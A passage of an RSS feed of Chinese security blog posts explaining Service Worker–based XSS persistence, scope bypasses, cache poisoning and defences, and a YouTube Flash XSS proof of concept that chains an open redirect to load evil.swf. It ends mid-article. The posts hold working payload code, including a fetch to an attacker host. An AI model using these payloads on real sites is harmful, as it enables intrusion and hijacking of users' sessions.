&lt;p&gt;service worker是一段脚本，与web worker一样，也是在后台运行。作为一个独立的线程，运行环境与普通脚本不同，所以不能直接参与web交互行为。native app可以做到离线使用、消息推送、后台自动更新，service worker的出现是正是为了使得web app也可以具有类似的能力。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这篇文章中，我将讲解：&lt;/p&gt;&lt;p&gt;攻击：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Service Worker是什么？&lt;/li&gt;&lt;li&gt;我们如何用SW攻击？&lt;/li&gt;&lt;li&gt;一些SW的攻击案例。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;防护:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者们有什么对策?&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;对SW进行register（注册）&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/sw.js&quot;)
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;注册SW时必须满足以下要求：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;和register操作的页面处于同源&lt;/li&gt;&lt;li&gt;运行Secure Context&lt;/li&gt;&lt;li&gt;Content-Type的种类应该为javascript，比如以下几种类型&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;&lt;i&gt;text/javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/x-javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/javascript&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Secure Context又是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Secure Context指的是来源必须是安全的(比如HTTPS)或者来自默认的(如：&lt;a href=&quot;http://localhost/&quot;&gt;http://localhost&lt;/a&gt; )。通过这些限制，我们可以阻止中间人(MITM)攻击。除此之外，我们还要限制某些特权API（比如获得地理位置，Web&lt;br&gt;USB，摄像头/录音器的API）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;曾经的Application Cache&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在Service Woeker出现前，人们使用AppCache进行缓存。由于AppCache使用复杂并且不受Secure&lt;br&gt;Context限制，人们就用SW替换了AppCahce。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了更严格的限制，攻击者应该如何利用SW呢？通常来讲，我们需要在HTTPS的同源网站中：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;找到XSS，利用XSS注册SW Script&lt;/li&gt;&lt;li&gt;找到可利用的SW Script位置(而且Content-Type得为javascript，有没有什么简单粗暴的途径帮我们找到属于我们的Service Worker Script呢？)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径１——JSONP&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有些时候，我们可以指定回调函数为被注册的脚本，以此写入任意代码&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://example.com/jsonp?callback=alert(1)//&quot;&gt;https://example.com/jsonp?callback=alert(1)//&lt;/a&gt;&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]

alert(1)//({});&lt;/code&gt;&lt;p&gt;一个XSS+JSONP的案例：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/xss?=&amp;lt;script&amp;gt;navigator.serviceWorker[...]

&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/jsonp?callback=[SW_HERE]//&quot;);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/jsonp?q=onfetch=e=&amp;gt;console.log(&#39;fetch&#39;)//

HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]
onfetch=event=&amp;gt;console.log(&#39;fetch&#39;)//({});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径２——文件上传&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当一个服务器允许我们上传JavaScript文件时，它返回该文件的Content-Type也极有可能是JavaScript。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个文件上传XSS+SW register的场景：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
var
formData = new FormData();
formData.append(&quot;csrf_token&quot;,
&quot;secret&quot;);
var
sw = &quot;/* [SW_CODE] */&quot;;
var
blob = new Blob([sw], { type: &quot;text/javascript&quot;});
formData.append(&quot;file&quot;,
blob, &quot;sw.js&quot;);
fetch(&quot;/upload&quot;,
{method: &quot;POST&quot;, body: formData}).then(/* Register SW */);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;成功注册脚本之后呢？&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;我们对页面更持久的控制（比如存储型XSS)。就算用来注册的XSS失效，我们也依然可以使用SW对页面进行后续控制。&lt;/li&gt;&lt;li&gt;监听/更改请求或响应&lt;/li&gt;&lt;li&gt;使用恶意Flash跨域读取内容&lt;/li&gt;&lt;li&gt;升级反射型XSS变成存储型XSS&lt;/li&gt;&lt;li&gt;可以一直持续到SW过期&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;打个比方，无论访问哪个URL，下面的代码都只会返回alert:&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
body =
&#39;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#39;;
init =
{headers:{&#39;content-type&#39;:&#39;text/html&#39;}};
e.respondWith(new Response(body,init));
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之一：Scope&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在使用`navigator.serviceWorker.register()`注册脚本时，我们可以在第二个参数中提供一个Scope（范围）。调用超出该Scope的资源会被视为非法行为。那么怎么定义合法的scope呢？在注册脚本时，我们需要提供一个相对地址，该目录的上一层或同级目录都被视为不可控的Scope，不过开发者可以控制自身及子目录。如果省略该参数，第一个参数下的目录会被成Scope。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;例如：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/sw.js&quot;,
{scope: &quot;/&quot;})
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;除此之外，我们只能指定同源的地址：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;无效：&quot;/assets/js/sw.js&quot;,
{scope: &quot;https://other.example.com/&quot;}
无效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/&quot;}
无效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/css/&quot;}
有效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/js/&quot;}
有效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/js/sub/&quot;}&lt;/code&gt;&lt;p&gt;如果你开启了 Service-Worker-Awed 头，那么就可以指定同域下开启该header的任意路径。(下面的例子允许我们用/当Scope)&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
200 OK
content-type:
text/javascript
service-worker-allowed:
/
[...]&lt;/code&gt;&lt;p&gt;在某些情况下（一般来讲，攻击者会被规范禁止），你可以通过编码/来突破上述限制：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/api/jsonp
https://example.com/api%2Fjsonp&lt;/code&gt;&lt;p&gt;除了注册时有这种越权风险，我们注册后也有可能通过编码绕过scope限制（同样取决于服务器的设定）。打个比方，我们可以用这两种形式表示同一个页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/out-of-scope/
https://example.com/foo/..%2Fout-of-scope%2F&lt;/code&gt;&lt;p&gt;如果我们用/foo/来当Service Worker的Scope。当我们访问/foo/..%2Fout-of-scope%2F时，我们就可以越权获得信息。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之二：生命周期&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了保证安全性，每个Service Worker都有时间限制。在授权24小时后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS+SW+Flash&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果捕捉到Flash响应，我们可以用该响应创建一个有该源权限的恶意Flash（只对firefox有用，chrome会直接下载Flash）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
e.respondWith(fetch(&quot;//attacker/poc.swf&quot;))
}&lt;/code&gt;&lt;p&gt;这有什么危害呢？当example.com存在如下的crossdomain时：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;&amp;lt;?xml
version=&quot;1.0&quot;?&amp;gt;
&amp;lt;cross-domain-policy&amp;gt;
&amp;lt;allow-access-from
domain=&quot;example.jp&quot; /&amp;gt;
&amp;lt;/cross-domain-policy&amp;gt;&lt;/code&gt;&lt;p&gt;我们可以在example.jp上创建flash并读取example.com内容（某种意义上的SOP绕过）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Foreign fetch&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;只要资源被当前源引用，即使是不同源的图像或脚本也可以被service worker篡改&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;比如在example.jp下有这么一个标签：&lt;/p&gt;&lt;blockquote&gt;&amp;lt;script src=&quot;//example.com/socialbutton.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于example.com的资源被example.jp调用，example.jp的SW可以直接修改socialbutton.js&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们可以用Foreign Fetch来制造XSS：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;self.addEventListener(&#39;install&#39;,e =&amp;gt; {
e.registerForeignFetch({
scopes: [&#39;/&#39;],
origins:
[&#39;*&#39;]//通配所有的源
});});

onforeignfetch= e =&amp;gt; {
e.respondWith(fetch(e.request).then(res =&amp;gt;
({
response:
new Response(&#39;alert(1)&#39;)//返回弹窗代码
})))}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击SW cache（缓存）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;注意，HTTP cache不等于SW Cache。只有在被脚本调用时才会返回cache。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch= event =&amp;gt; {
event.respondWith(
caches.open(&quot;v1&quot;).then(function(cache) {
return cache.match(event.request).then(function(response) {
if (response) {
return response;//
} else {
return fetch(event.request.clone()).then(function(response) {
cache.put(event.request,
response.clone());//
return response;
});}})}));
};&lt;/code&gt;&lt;p&gt;攻击这可以用XSS添加请求/响应到cahce中（这个例子添加了posion.html到响应中）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
caches.open(&quot;v1&quot;).then(function(cache){
content =
&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;;
init = {headers: {&quot;content-type&quot;:
&quot;text/html&quot;}};
request = new
Request(&quot;poison.html&quot;);
response = new Response(content, init);
cache.put(request, response);
})
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;比较：基于localStorage的XSS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;考虑以下localStorage的误用：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
document.write(localStorage.getItem(&#39;name&#39;));
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;在Service Worker中，我们不可以直接对DOM进行操作，而且SW也有24小时的生命周期。但是由于SW及其强大的特权，很难说SW cache比localStorage更安全&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;防御：如何删除Service Worker?&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;通过JavaScript&lt;/li&gt;&lt;li&gt;使用Clear-Site-Data headers&lt;/li&gt;&lt;li&gt;手动消除（仅使用于Chrome）&lt;/li&gt;&lt;li&gt;chrome://serviceworker-internals（不过Cache Storage不会被删除）&lt;/li&gt;&lt;li&gt;开发者工具 -&amp;gt; Application -&amp;gt; Clear Storage&lt;/li&gt;&lt;li&gt;chrome://settings/clearBrowserData -&amp;gt; Clear Browser Data&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Clear-Site-Data头&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个头可以删除当前源的所有的存储数据（或者指定数据），比如说：Clear-Site-Data:&quot;cookie&quot;可以删除所有cookie。该功能已经在Chrome61得到了支持。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一个清除storage的响应：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;HTTP/1.1
200 OK
Content-Type:text/html
Clear-Site-Data:
&quot;storage&quot;&lt;/code&gt;&lt;h2&gt;&lt;b&gt;如何阻止他人注册恶意SW&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当注册SW时，会发生如下的请求：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET https://example.com/sw.js HTTP/1.1
Host:example.com
Connection:keep-alive
Pragma:no-cache
Cache-Control:no-cache
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
likeGecko) Chrome/61.0.3163.79 Safari/537.36
Accept:*/*
Service-Worker:script
Referer: https://example.com/
Accept-Encoding:
gzip, deflate, br
Accept-Language:
ja,en;q=0.8,en-US;q=0.6```&lt;/code&gt;&lt;p&gt;我们可以通过拒绝非SW Script却又包含Service-Worker:script头的请求以进行防范&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;基于Service Worker的XSS可能带来的问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;XSS持久化&lt;/li&gt;&lt;li&gt;新型Flash攻击&lt;/li&gt;&lt;li&gt;SW缓存劫持&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;如何进行防御：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;治病需治根：防范XSS&lt;/li&gt;&lt;li&gt;拒绝非SW Script（比如jsonp，文件上传功能）对Service-Worker:script的请求&lt;/li&gt;&lt;/ol&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-29-29734820</guid>
<pubDate>Fri, 29 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Flash漏洞的死灰复燃4</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-23-29603213.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Flash漏洞的死灰复燃4&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29603213&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15c5fa926c08ed689f8fa33eaea7cc9b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Youtube以 &lt;i&gt;youtube.com/embed/[VIDEO_ID]&lt;/i&gt; 的地址形式提供了 HTML5 API。当 iframe 开始加载时，它会首先检查浏览器是否支持 HTML5 播放器。如果不行的话，它会退回成 flash 播放器。不过用户也可在 url 中使用 nohtml5=1 参数来强制使用 flash 播放器。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ae7c78e597fb6fa793246083cc05e121_r.jpg&quot; data-rawwidth=&quot;1144&quot; data-rawheight=&quot;762&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你用我们[第一部分]的实例和这一个作对比，你会发现 iframe&quot;Youtube Embed&quot;实质上代替了&quot;Youtube Wrapper&quot;，Flash/javascript 转换API也被换成了更加现代化的 postMessage 和 sharedEvent。换个角度来想，Flash 和 HTML5 都提供了类似的功能，只是实现不一样罢了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Youtube的Flash API和iframe API十分相似。浏览器也因此实现了一个奇葩的行为，它们会自动把&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;object data=”youtube.com/v/[VIDEO_ID]”&amp;gt;
(Youtube Flash api)替换成&amp;lt;object
data=”youtube.com/embed/[VIDEO_ID]”&amp;gt;(Youtube iframe api) 以强制将网站的Flash换为html5&lt;/code&gt;&lt;p&gt;触发 Youtube 上基于 Flash 的 XSS 不一定要直接从主站，在这里，我们将介绍如何利用命令发送功能&lt;i&gt;（如 playVideo() ,pauseVideo() ）&lt;/i&gt;攻陷Flash文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;基于loadPlaylist的XSS&lt;/h2&gt;&lt;p&gt;loadPlaylist() 允许 youtube 的 iframe 加载一个播放列表。它的参数一般为 Youtube 的某个播放列表 id 或者一个包含 Youtube 视频 ID 的数组。当选择使用数组时，我们还可以给每个视频注入预览图片 url。&lt;br&gt;&lt;/p&gt;&lt;p&gt;Flash也用 Loader.load 加载图像（和加载外部Flash文件 一样），我们可以将图片URL替换为swf 文件，原本用来加载 Loader.load 现在则会执行 swf。不过主程序会先检查一遍该 URL 是否在 youtube.com 域上，再加载该 URL。所幸的是，谷歌并不会修复 URL 任意跳转漏洞。我们便可以使用 youtube 的跳转功能完成攻击。虽然 Youtube 只能重定向用户到 google.com，但我进一步利用了谷歌的任意跳转来达到目的：&lt;br&gt;https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf。当Youtube.com/embed/XXX加载了evil.swf，我们就可以使用自己的XSS payload了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;默认情况下，Flash只给同一个域名下的Flash开启Flash/js转换API。但youtube.com/embed/[VIDEO_ID] &amp;lt;object&amp;gt;标签使用了属性 allowscriptaccess=always （对任意Flash开启Flash/js转换API）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是PoC的大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-368d9ab8d113aea3a48afc5b48279f10_r.jpg&quot; data-rawwidth=&quot;1372&quot; data-rawheight=&quot;556&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;evil.com/evil.html源代码：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!-- 降级Youtube iframe html5播放器为Flash播放器
--&amp;gt;
&amp;lt;iframe id=&quot;player&quot;
src=&quot;https://www.youtube.com/embed/?nohtml5=1&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script&amp;gt;
// 延迟5秒，让 Youtube iframe 完全加载
setTimeout(
function(){
// 用postMessage发送loadPlaylist和预览图像链接命令给Youtube iframe
document.getElementById(&quot;player&quot;).contentWindow.postMessage(&#39;{&quot;command&quot;:&quot;loadPlaylist&quot;,&quot;data&quot;:[{&quot;video_id&quot;:&quot;xyz&quot;,&quot;iurl&quot;:&quot;https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf&quot;}]}&#39;,
&quot;*&quot;);
}
, 5000);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;evil.swf源代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class Main extends Sprite {
public function Main(){
// 用Flash/js转换API执行XSS
ExternalInterface.call(&quot;alert&quot;, &quot;document.domain + &#39;
XSSed!&#39;&quot;);
}
}&lt;/code&gt;&lt;p&gt;攻击场景：&lt;/p&gt;&lt;p&gt;要求：目标开启了Flash player&lt;/p&gt;&lt;ol&gt;&lt;li&gt;目标浏览evil.com/evil.html&lt;/li&gt;&lt;li&gt;evil.html加载youtube.com/embed iframe&lt;/li&gt;&lt;li&gt;evil.com发送payload&lt;/li&gt;&lt;li&gt;youtube.com/embed加载了evil.swf&lt;/li&gt;&lt;li&gt;evil.com在youtube.com/embed中执行了XSS&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;trustedLoader正则表达式引起的血案&lt;/h2&gt;&lt;p&gt;除了像 playVideo 和 loadPlaylist 这类的公开命令外，Youtube也有许多私有命令。不过它们只能被验证过的源加载（比方说google&lt;br&gt;drive）。往往程序用了一个正则去过滤，如下：&lt;/p&gt;&lt;code lang=&quot;as&quot;&gt;public static const trustedLoader:RegExp = new
RegExp(&quot;^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))&quot;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;在读余下的文章之前，我强烈建议读者先试着找出上面这条式子的错误&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;--------------------余下正文----------------------&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;`.`（点）在正则表达式中代表着通配符。如果你想匹配一个普通的点，那么你要用`\.`的方式escape。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在trustedLoader的正则中，我们发现了如下代码：&lt;/p&gt;&lt;p&gt;24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注意到了吗？这里的点并不表示匹配`.`符号（而是一个通配符）。哪怕传递的是不被谷歌控制的url&lt;i&gt;（比如 http://24e12c4a-a-95274a9c-s-sitesAgooglegroups.com/a/google.com/flash-api-test-harness/apiharness.swf ，注意大写的A）&lt;/i&gt;，它也会返回true。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我花了一美刀买下了这个域名，再让 swf 调用私有命令 updateVideoData() 来任意执行命令。因为 updateVideoData 的工作原理和 loadPlaylist 类似，我就不再放上PoC了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;trustedLoader，再一次！&lt;/h2&gt;&lt;p&gt;我们再来看看其他表达式：`google(\.com|\.co)?\.[a-z]{2,3}`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;很遗憾，我们可以轻松绕过这一防御：`google.com.fun`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;以及这个：&lt;i&gt;www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;正则本身没有问题，然而&lt;a href=&quot;http://www.gstatic.com/&quot;&gt;www.gstatic.com&lt;/a&gt;存在许多XSS。我们能通过XSS让 &lt;i&gt;www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris &lt;/i&gt;加载 Youtube 的 iframe，最后发送 updateVideoData() 来X站。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是大概的工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-09c6bd5094d7309e827bc6f7a46bb036_r.jpg&quot; data-rawwidth=&quot;1852&quot; data-rawheight=&quot;816&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前提：目标安装了Flash并打开 &lt;i&gt;www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[javascript代码]&lt;/i&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;js代码先让 &lt;a href=&quot;http://www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf&quot;&gt;www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf&lt;/a&gt; 加载了一个到` &lt;a href=&quot;https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris%60&quot;&gt;https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris&lt;/a&gt; 的iframe&lt;/li&gt;&lt;li&gt;js代码再让 https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris 加载一个倒 youtube 的 iframe。&lt;/li&gt;&lt;li&gt;iframe发送一个 updateVideoData()。过滤器没有检测出异常，并接受了请求&lt;/li&gt;&lt;li&gt;主程序加载了恶意Flash，成功地执行了XSS&lt;/li&gt;&lt;/ol&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-23-29603213</guid>
<pubDate>Sat, 23 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>看我如何将flash漏洞死灰复燃（2&amp;3部分）</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-19-29469971.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;看我如何将flash漏洞死灰复燃（2&amp;amp;3部分）&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29469971&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;2 通过 appLoader 进行 XSF&lt;/h2&gt;&lt;p&gt;我在前一章节中介绍了 youtube 的一个信息泄露漏洞。在这一章节里，我将介绍一个任意Flash 代码执行漏洞。这一类漏洞十分像 XSS，只不过我们通常称呼其为跨站点 Flash 执行(XSF) 或者 Flash SOP 绕过。这一章节理解起来可能比较困难，我强烈建议读者到&lt;a href=&quot;http://www.senocular.com/flash/tutorials/contentdomains/&quot;&gt;[这里]&lt;/a&gt;预习背景知识。&lt;/p&gt;&lt;p&gt;让我们先来看看 Youtube 的 Flash API 及其安全沙箱：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.png&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;328&quot;&gt;&lt;p&gt;Loader（加载文件）对象能通过以下两种方式加载外部 Flash 文件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通过正常的 Loader.load() 方式加载（类似 `iframe`，即两个 Flash 都有独立的安全沙箱）&lt;/li&gt;&lt;li&gt;如果 loader 使用了参数 `SecurityDomain.currentDomain`，那么被加载的 flash 文件就会和loader 在同一沙箱内执行（可以比作`&amp;lt;script src=&quot;&quot;&amp;gt;`）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;gt; 注意，虽然图中的主程序和其加载的模块都属于同一个域名，但参数`SecurityDomain.currentDomain` 